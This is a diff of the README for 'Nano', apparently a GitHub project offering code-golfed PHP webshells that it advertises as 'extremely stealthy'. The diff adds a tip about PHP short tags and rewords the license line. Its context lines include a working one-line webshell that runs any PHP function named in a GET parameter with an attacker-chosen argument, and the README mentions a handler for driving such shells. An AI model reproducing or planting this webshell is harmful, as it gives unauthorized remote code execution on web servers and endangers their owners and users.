@@ -2,6 +2,9 @@
 Nano is a family of PHP webshells which are code golfed to be extremely stealthy and efficient.\
 Put it on watch maybe, I will continue to upload more webshells in here.
 
+**Note:** You may need to tweak some parts of the code if it doesn't work out for your.\
+For example, if short tags are disabled, you will need to replace <? with <?php.
+
 ### Nano
 ```php
 <?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);
@@ -42,4 +45,4 @@ Too much work? You can use the [handler](https://github.com/UltimateHackers/nano
 
 #### Everything Else
 This is my first php thingy so if there's way to do what I did in a better way please let me know or open a pull request.\
-This 39 characters of code is licensed under **MIT license** which basically means you have to give me credit if you want to redistribute or modify it.
+The nano project is licensed under **MIT license** which basically means you have to give me credit if you want to redistribute or modify it.
